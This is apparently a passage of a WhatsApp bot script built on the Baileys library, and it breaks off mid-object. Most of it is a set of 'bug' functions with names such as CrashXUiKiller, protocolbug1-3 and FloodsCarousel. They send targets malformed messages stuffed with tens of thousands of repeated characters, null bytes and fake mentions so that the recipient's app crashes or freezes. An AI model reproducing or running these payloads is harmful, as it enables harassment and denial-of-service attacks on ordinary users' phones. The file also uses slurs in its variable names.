require('../setting/config')

const fs = require('fs')
const axios = require('axios')
const chalk = require("chalk")
const fetch = require("node-fetch")
const jimp = require("jimp")
const os = require('os')
const path = require('path')
const util = require("util")
const moment = require("moment-timezone")
const { spawn, exec, execSync } = require('child_process')

const {
default: baileys,
proto,
jidNormalizedUser,
generateWAMessage,
generateWAMessageFromContent,
getContentType,
prepareWAMessageMedia,
} = require("@whiskeysockets/baileys")

module.exports = FadelSM = async (FadelSM, m, chatUpdate, mek, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
)

const budy = (typeof m.text === 'string' ? m.text : '')

var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""

const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0]
if (m && type == "protocolMessage") FadelSM.ev.emit("message.delete", m.message.protocolMessage.key)
const { sender } = m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us")

//database 
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'))

const botNumber = await FadelSM.decodeJid(FadelSM.user.id)
const Access = [global.owner, ...kontributor, ...global.owner]
.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
.includes(m.sender) ? true : m.isChecking ? true :false

const prefa = ["", "!", ".", ",", "🐤", "🗿"]
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushname || "No Name";
const text = q = args.join(" ")

const fatkuns = m.quoted || m;
const quoted = 
fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
m.quoted ? m.quoted :
m;

const qmsg = quoted.msg || quoted;
const mime = qmsg.mimetype || '';
const isImage = type === 'imageMessage';
const isVideo = type === 'videoMessage';
const isAudio = type === 'audioMessage';
const isMedia = /image|video|sticker|audio/.test(mime)

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
//group
const groupMetadata = isGroup ? await FadelSM.groupMetadata(m.chat).catch(() => {}) : "";
const groupOwner = isGroup ? groupMetadata.prem : "";
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
//time
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss")
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
}

const peler = fs.readFileSync('./start/lib/media/peler.jpg')
const cina = [
"https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg",
"https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg",
"https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg",
"https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg"
]
 
function getRandomImage() {
const randomIndex = Math.floor(Math.random() * cina.length)
return cina[randomIndex]
}
const cinahitam = getRandomImage()

async function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

//function
const {
smsg,
sendGmail,
formatSize,
isUrl,
generateMessageTag, 
getBuffer,
getSizeMedia, 
runtime, 
fetchJson,
getRandom
} = require('./lib/myfunction')

const { 
imageToWebp, 
videoToWebp,
writeExifImg,
writeExifVid,
addExif
} = require('./lib/exif')

const {
jadibot,
stopjadibot,
listjadibot
} = require('./jadibot')

const reaction = async (jidss, emoji) => {
FadelSM.sendMessage(jidss, {
react: {
text: emoji,
key: m.key 
} 
}
)
}

if (m.message) {
if (isCmd && !m.isGroup) {
console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)))
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)))
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`
 )
 )
)
} else if (m.isGroup) {
console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)))
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)))
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`
 ))
 )
}
}

//FUNC BUG INVIS
let resize = async (image, width, height) => {
let oyy = await jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
return kiyomasa
}

async function InVisibleX(isTarget, target) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝙳𝙴𝙰𝚃𝙷 𝙾𝙵 𝙵𝙰𝚃𝙷𝙴𝚁@",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "𝙳𝙴𝙰𝚃𝙷 𝙾𝙵 𝙵𝙰𝚃𝙷𝙴𝚁@" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "꧄꧄꧍"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "꧄꧄꧍"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});
        
            await FadelSM.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (isTarget) {
                await FadelSM.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "꧄꧄꧍",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }
        
async function DelayStc(isTarget, mention) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: isTarget,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: { low: 3304, high: 0, unsigned: true },
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: { low: 1746262763, high: 0, unsigned: false },
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

async function ProtoXAudio(isTarget, mention) {
    console.log("Attack TraVisZap Delay")
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await FadelSM.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await FadelSM.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "INVIS - BETA" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

  await FadelSM.relayMessage(isTarget, stickerMsg.message, { messageId: stickerMsg.key.id });
}

async function protocolbug1(isTarget, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "𝙳𝙴𝙰𝚃𝙷 𝙾𝙵 𝙵𝙰𝚃𝙷𝙴𝚁@",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: isTarget,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "x".repeat(5000)
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(isTarget, MSG, {});

await FadelSM.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await FadelSM.relayMessage(
isTarget,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "꫟" },
content: undefined
}
]
}
);
}
}

async function protocolbug2(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "? ???????-?",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await FadelSM.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await FadelSM.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "???? ???????? - ????" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/putraxlow_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await FadelSM.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await FadelSM.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
    }

async function FloodsCarousel(target, Ptcp = true) {
      const header = {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
        },
        hasMediaAttachment: true,
      };

      const body = {
        text: "AH AH" + "\u0000".repeat(90000),
      };

      const carouselMessage = {
        sections: [
          {
            title: " ϟ ",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".crasher" },
              { title: " ϟ ", description: " ", rowId: ".crasher" },
            ],
          },
          {
            title: "Section 2",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".crasher" },
              { title: " ϟ ", description: " ", rowId: ".crasher" },
            ],
          },
        ],
      };

      await FadelSM.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp ? { participant: { jid: target } } : { quoted: NullNihBos }
      );
      }

async function nullQ(target) {
  let mentioned = Array.from({ length: 100000 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
  );

  await FadelSM.relayMessage(target, {
    listResponseMessage: {
      title: "@putraxlow",
      listType: 2,
      buttonText: null,
      sections: null,
      singleSelectReply: { selectedRowId: "X" },
      contextInfo: {
        mentionedJid: mentioned,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        mentionedJid: ["13135550002@s.whatsapp.net"],
        quotedMessage: {
          interactiveResponseMessage: {
            body: {
              text: "@putraxlow",
              format: 1
            },
            nativeFlowResponseMessage: {
              name: "menu_options",
              paramsJson: "\u0000".repeat(999999),
              version: 3
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741
            }
          }
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      }
    },
    description: "X"
  }, {
    participant: { jid: target }
  });
}

async function CrashXUiKiller(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: venomModsData + "ꦾ"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: venomModsData + "ꦾ"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await FadelSM.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("Crash X Flooding"));
        }
let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

async function FlowXsx(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "\u0000",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await FadelSM.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
async function CursorimgDoc(target) {
const buttons = [
{ buttonId: "\u0000".repeat(299999), buttonText: { displayText: "Haii?" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }, 
{
buttonId: "\u0000", 
buttonText: { displayText: '〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙' }, 
type: 1, 
nativeFlowInfo: { 
name: '〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(220000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 2 
}
}
];
let messagePayload = {
viewOnceMessage: {
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"caption": "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙" + "\u0000".repeat(199) + "ꦾ".repeat(15999), 
"fileSha256": "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
"fileLength": "99999999999",
"height": 307,
"width": 734,
"mediaKey": "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
"fileEncSha256": "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
"directPath": "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1738686532",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
"scansSidecar": "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw==",
"scanLengths": [
2226,
6362,
4102,
6420
],
